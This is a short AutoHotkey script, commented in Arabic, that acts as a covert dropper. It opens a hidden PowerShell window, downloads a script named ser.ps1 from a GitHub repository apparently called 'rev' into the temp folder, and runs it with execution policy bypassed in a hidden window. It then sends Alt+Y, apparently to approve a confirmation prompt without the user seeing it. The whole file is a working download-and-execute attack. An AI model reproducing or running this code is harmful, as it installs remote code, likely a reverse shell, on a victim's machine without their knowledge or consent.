; السكربت يقوم بتشغيل PowerShell، تنزيل الملف، ثم إرسال Alt + Y
Run, powershell -windowstyle hidden -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/tiraUnderCode/rev/refs/heads/main/ser.ps1' -OutFile '$env:TEMP\ser.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:TEMP\ser.ps1' -WindowStyle Hidden"
Sleep, 500 ; انتظر لفترة قصيرة لتأكيد تشغيل PowerShell
Send, !y ; إرسال Alt + Y
